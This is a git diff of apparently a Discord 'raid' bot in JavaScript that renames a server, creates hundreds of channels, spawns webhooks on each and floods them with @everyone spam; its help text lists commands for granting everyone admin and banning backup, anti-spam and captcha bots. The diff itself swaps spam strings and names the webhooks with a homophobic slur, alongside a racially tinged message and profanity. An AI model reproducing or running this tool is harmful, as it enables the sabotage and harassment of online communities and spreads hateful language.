@@ -33,21 +33,22 @@ client.on("message", async (message) => {
             if(message.guild.channels > 500) return message.channel.send(`too much text channels`)
             let i;
             if(!args.slice(0).join(' ')){ 
-                message.guild.setName('haha admin go grr -ags and gs')
+                message.guild.setName('haha admin go grr')
                 for(i = 0; i < 499; i++){
                     message.guild.createChannel('haha admin go grr', 'text').then(m =>{
                         const mch1 = message.channel.id
                         m.createWebhook("get raided faggots").then(w => {
                           const case1hook = new Discord.WebhookClient(w.id, w.token)
-                          case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                          case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                          case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                          case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                          case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                          case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                          case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                          case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                          case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                         })
                     })
                     message.guild.createChannel('haha admin go grr', 'voice')
@@ -59,16 +60,16 @@ client.on("message", async (message) => {
                         const mch2 = message.channel.id
                         m.createWebhook("get raided faggots").then(w => {
                           const case2hook = new Discord.WebhookClient(w.id, w.token)                        
-                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                         })
                     })
                     message.guild.createChannel(`${args.slice(0).join(' ')}`, 'voice')
@@ -99,7 +100,7 @@ client.on("message", async (message) => {
             "$admall - self explanatory",
             "$servername (new server name) - self explanatory",
             "$antiprotector - bans xenon (backup bot), betterantispam and some captcha bots",
-            "$yes (vc id) - plays some catch the wave", //please for love of god dont hate on this command, i spent almost 1 hour just to find the proper ffmpeg buildpack for heroku and the opus package for this bot
+            "$yes (vc id) - plays some weebness", //please for love of god dont hate on this command, i spent almost 1 hour just to find the proper ffmpeg buildpack for heroku and the opus package for this bot
             `$help - bruhhh\n`,
             "Bot by paradino, making gachafags and furries lifes worse"]
             message.author.send(`${help.slice(0).join(`\n`)}`).catch(() => message.channel.send(`enable yo dms dumbass`))
